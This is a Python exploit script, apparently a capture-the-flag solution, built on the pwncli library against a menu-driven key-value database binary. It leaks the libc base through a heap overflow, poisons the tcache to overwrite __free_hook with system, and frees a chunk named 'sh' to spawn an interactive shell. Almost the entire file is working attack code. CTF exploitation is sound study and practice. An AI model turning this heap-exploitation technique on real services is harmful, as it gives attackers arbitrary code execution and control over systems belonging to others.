#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *

cli_script()
set_remote_libc("libc.so.6")
# context.log_level = "error"

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c: str(c).encode()
lg = lambda s: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s, eval(s)))
debugB = lambda: input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)


def db_cmd(choice):
    ru(b"Your choice: ")
    sl(i2b(choice))


def create_db(name, db_type):
    db_cmd(1)
    ru(b"Please input the name of database: ")
    sl(name)
    ru(b"Please input the type of database: ")
    sl(i2b(db_type))


def use_db(name):
    db_cmd(2)
    ru(b"Please input the name of database: ")
    sl(name)


def add_valuekey(key, value):
    ru(b"Your choice: ")
    sl(i2b(1))
    ru(b"Input the key: ")
    sl(i2b(key))
    ru(b"Input the value: ")
    sl(value)


def show_valuekey(key):
    ru(b"Your choice: ")
    sl(i2b(2))
    ru(b"Input the key: ")
    sl(i2b(key))


def edit_valuekey(key, value):
    ru(b"Your choice: ")
    sl(i2b(3))
    ru(b"Input the key: ")
    sl(i2b(key))
    ru(b"Input the new value: ")
    sl(value)


def delete_valuekey(key):
    ru(b"Your choice: ")
    sl(i2b(4))
    ru(b"Input the key: ")
    sl(i2b(key))


def leave_op():
    ru(b"Your choice: ")
    sl(i2b(666))


def delete_db(name):
    db_cmd(3)
    ru(b"Please input the name of database: ")
    sl(name)


def show_db():
    db_cmd(4)

def change_dbname(dbname, newname):
    db_cmd(5)
    ru(b'Please input the name of database: ')
    sl(dbname)
    ru(b'Please input the new name for database: ')
    sl(newname)



# leak libc base first
attacker_database = b"eastXueLian".ljust(0x70, b"a")
create_db(attacker_database, 2)
use_db(attacker_database)
for i in range(9):
    add_valuekey(i, b"a")
for i in range(6):
    delete_valuekey(i)
delete_valuekey(7)
delete_valuekey(6)

leave_op()
create_db(b"a"*0x90, 2)

use_db(attacker_database)
edit_valuekey(8, b"a"*0x98)
leave_op()

show_db()
ru(b"\t")
ru(b"\t")
leak = ru(b"\n", drop=True)
libc_base = u64_ex(leak) - 0x100 - libc.sym.__malloc_hook
lg("libc_base")


# tcache attack
use_db(leak)
for i in range(7):
    add_valuekey(i, b"aaa")
for i in range(5):
    delete_valuekey(i)
delete_valuekey(6)
leave_op()

show_db()
ru(b"\t")
ru(b"\t")
leak = ru(b"\n", drop=True)
change_dbname(leak, p64(libc_base + libc.sym.__free_hook - 0x10))

create_db(b"sh", 3)

use_db(attacker_database)
add_valuekey(0xde, b"eastXueLian")
add_valuekey(0xad, p64(libc_base + libc.sym.system))
leave_op()

delete_db(b"sh")

ia()
